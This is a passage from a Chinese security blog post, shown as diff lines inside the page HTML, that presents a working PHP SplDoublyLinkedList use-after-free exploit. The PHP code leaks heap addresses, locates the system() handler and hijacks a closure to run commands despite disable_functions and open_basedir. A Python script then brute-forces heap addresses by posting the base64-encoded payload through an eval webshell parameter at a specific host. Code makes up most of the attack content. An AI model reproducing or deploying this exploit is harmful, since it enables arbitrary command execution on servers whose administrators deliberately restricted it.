class="number">0x1000</span> * <span class="number">0x80</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="variable">$i</span> * <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$addr</span> &lt; <span class="variable">$lowestAddr</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$nameAddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$addr</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nameAddr</span> &gt; <span class="variable">$address</span> || <span class="variable">$nameAddr</span> &lt; <span class="variable">$lowestAddr</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$nameAddr</span>));</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">str_pad</span>(<span class="variable">$name</span>, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$name</span>));</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\x00&quot;</span>, <span class="variable">$name</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$addr</span> + <span class="number">0x08</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trigger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$s</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;T&quot;</span>, <span class="number">0xf</span>));</span><br><span class="line">        <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="number">0x1234567812345678</span>);</span><br><span class="line">        <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">7</span>);</span><br><span class="line">        <span class="variable">$s</span> -&gt; <span class="title function_ invoke__">current</span>();</span><br><span class="line">        <span class="variable">$s</span> -&gt; <span class="title function_ invoke__">next</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span> -&gt; <span class="title function_ invoke__">current</span>() !== <span class="number">0x1234567812345678</span>) &#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;[!]UAF Failed&quot;</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">        <span class="variable">$maps</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$maps</span>) &#123;</span><br><span class="line">	        <span class="title function_ invoke__">cantRead</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">canRead</span>(<span class="variable">$maps</span>, <span class="variable">$a</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+]Done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params"><span class="variable">$elementAddress</span>, &amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$closureChunkAddress</span> = <span class="title function_ invoke__">getClosureChunk</span>(<span class="variable">$a</span>, <span class="variable">$elementAddress</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$closure_object</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$closureChunkAddress</span> + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Object: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$closure_object</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$closure_object</span> + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Handler: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$closure_handlers</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$system_address</span> = <span class="title function_ invoke__">getSystem</span>(<span class="variable">$a</span>, <span class="variable">$closure_handlers</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Find system&#x27;s handler: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$system_address</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x506</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$closure_object</span> + <span class="number">0x08</span> * <span class="variable">$i</span>);</span><br><span class="line">        <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$closure_object</span> + <span class="number">0x30</span>);</span><br><span class="line">        <span class="title function_ invoke__">i2s</span>(<span class="variable">$s</span> -&gt; <span class="title function_ invoke__">current</span>(), <span class="number">0x08</span> * <span class="variable">$i</span> + <span class="number">0x100</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$closure_object</span> + <span class="number">0x30</span>);</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$s</span> -&gt; <span class="title function_ invoke__">current</span>(), <span class="number">0x20</span>, <span class="variable">$system_address</span>);</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$closure_object</span>);</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x108</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Executing command: \n&quot;</span>;</span><br><span class="line">    (<span class="variable">$s</span> -&gt; <span class="title function_ invoke__">current</span>())(<span class="string">&quot;php -v&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canRead</span>(<span class="params"><span class="variable">$maps</span>, &amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$chunkAddress</span> = <span class="title function_ invoke__">getPHPChunk</span>(<span class="variable">$maps</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$elementAddress</span> = <span class="title function_ invoke__">getElement</span>(<span class="variable">$a</span>, <span class="variable">$chunkAddress</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">bypass</span>(<span class="variable">$elementAddress</span>, <span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cantRead</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">bomb1</span>(<span class="variable">$a</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$elementAddress</span> = <span class="title function_ invoke__">bomb2</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$elementAddress</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">bypass</span>(<span class="variable">$elementAddress</span>, <span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="keyword">new</span> <span class="title class_">Trigger</span>());</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="string">&quot;Twings&quot;</span>);</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="title function_ invoke__">push</span>(function(<span class="variable">$x</span>)&#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; <span class="number">0x100</span>;<span class="variable">$x</span>++) &#123;</span><br><span class="line">    <span class="variable">$s</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="number">0x1234567812345678</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="title function_ invoke__">rewind</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>Python 部分比较简单，写好爆破部分就成，我写的很烂，师傅们看个大概就好：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomb1</span>(<span class="params">_url</span>):</span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    addr = <span class="number">0x7f0000000000</span>  <span class="comment"># change here and bomb1() in php if failed</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            addr = addr + <span class="number">0x10000000</span> / <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;[+]Bomb &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; times, address of first chunk maybe: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">            content = requests.post(_url + <span class="string">&quot;?test1=&quot;</span> + urllib.quote(n2s(addr)), data=&#123;</span><br><span class="line">                <span class="string">&quot;c&quot;</span>: <span class="string">&quot;eval(base64_decode(&#x27;&quot;</span> + payload + <span class="string">&quot;&#x27;));&quot;</span>,</span><br><span class="line">            &#125;).content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;[!]&quot;</span> <span class="keyword">in</span> content <span class="keyword">or</span> <span class="string">&quot;502 Bad Gateway&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomb2</span>(<span class="params">_url, _addr1</span>):</span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    crashcount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _addr1 = _addr1 + <span class="number">0x200000</span></span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;[+]Bomb &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; times, address of php chunk maybe: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(_addr1))</span><br><span class="line">            content = requests.post(_url + <span class="string">&quot;?test2=&quot;</span> + urllib.quote(n2s(_addr1)), data=&#123;</span><br><span class="line">                <span class="string">&quot;c&quot;</span>: <span class="string">&quot;eval(base64_decode(&#x27;&quot;</span> + payload + <span class="string">&quot;&#x27;));&quot;</span>,</span><br><span class="line">            &#125;).content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;[!]&quot;</span> <span class="keyword">in</span> content <span class="keyword">or</span> <span class="string">&quot;502 Bad Gateway&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            crashcount += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+]PHP crash &quot;</span> + <span class="built_in">str</span>(crashcount) + <span class="string">&quot; times&quot;</span></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">open</span>(<span class="string">&quot;E:/Tools/php disable_functions bypass/all.php&quot;</span>).read()</span><br><span class="line">payload = base64.b64encode(<span class="string">&quot;?&gt;&quot;</span> + payload)</span><br><span class="line">url = <span class="string">&quot;http://7wings.monster:32770/eval.php&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+]Execute Payload, Output is:&quot;</span></span><br><span class="line">content = requests.post(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;c&quot;</span>: <span class="string">&quot;eval(base64_decode(&#x27;&quot;</span> + payload + <span class="string">&quot;&#x27;));&quot;</span>,</span><br><span class="line">&#125;).content</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">    addr1 = bomb1(url)</span><br><span class="line">    <span class="keyword">if</span> addr1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;---------------------------------------------------------------------------------&quot;</span></span><br><span class="line">    addr2 = bomb2(url, <span class="built_in">int</span>(addr1, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> addr2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;---------------------------------------------------------------------------------&quot;</span></span><br><span class="line">    <span class="built_in">print</span> addr2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> content</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+]Execute Payload Over.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h3><p>就像上面所说的，限制了 openbase_dir 情况下的利用，需要进行爆破，而且还会导致进程崩溃。</p>
+<p>由于本人水平限制，利用过程中可能存在各种各样的问题，如果各位师傅有更好的利用方式，欢迎指正与讨论。</p>
+<hr>
+<p>Orz</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHPUAF/">PHPUAF</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/10/21/Java-7u21-8u20-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Java 7u21/8u20 反序列化漏洞</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/10/13/commons-beanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <span>commons-beanutils反序列化漏洞</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHP SplDoublyLinkedList UAF 利用&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
